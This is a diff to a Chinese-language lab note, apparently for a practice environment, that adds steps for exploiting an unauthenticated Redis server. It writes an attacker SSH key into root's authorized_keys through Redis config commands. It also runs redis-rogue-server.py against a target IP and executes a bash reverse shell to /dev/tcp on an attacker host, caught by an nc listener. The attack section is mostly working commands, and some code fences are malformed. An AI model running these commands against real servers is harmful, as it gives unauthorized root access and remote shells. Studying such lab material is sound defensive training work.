@@ -67,7 +67,20 @@ bgsave    # 触发持久化（写入磁盘）
 
 
 
-## 漏洞利用：写入 SSH 公钥提权
+## 漏洞利用
+
+### 方法1、写入 SSH 公钥提权
+
+非交互式地生成 SSH 密钥对（无密码）
+
+```bash
+ssh-keygen -t rsa -b 4096 -N "" -f /root/.ssh/id_rsa
+
+cat /root/.ssh/id_rsa.pub
+···
+
+写入密钥
+
 ```bash
 config set dir /root/.ssh
 config set dbfilename "authorized_keys"
@@ -75,6 +88,29 @@ set x "\n\nssh‑rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD...\n\n"
 save
 ```
 save 执行成功，公钥写入靶机信任文件，可直接 ssh 登录服务器。
+
+### 方法2、反弹shell
+
+```bash
+python3 redis-rogue-server.py --rhost 目标机IP --rport 目标机端口 --lhost 攻击机IP --lport 攻击机端口
+
+python3 redis-rogue-server.py --rhost 10.165.15.225 --rport 6379 --lhost 10.165.15.22 --lport 21000
+```
+
+开始反弹skell
+
+1、攻击机第一个终端监听
+···bash
+nc -lvnp 4444
+···
+2、攻击机第二个终端输入
+···bash
+redis-cli -h 10.165.15.225 -p 6379
+system.exec "bash -c 'bash -i >& /dev/tcp/10.165.15.22/4444 0>&1'"
+```
+
+
+
 
 
 ## 销毁靶场
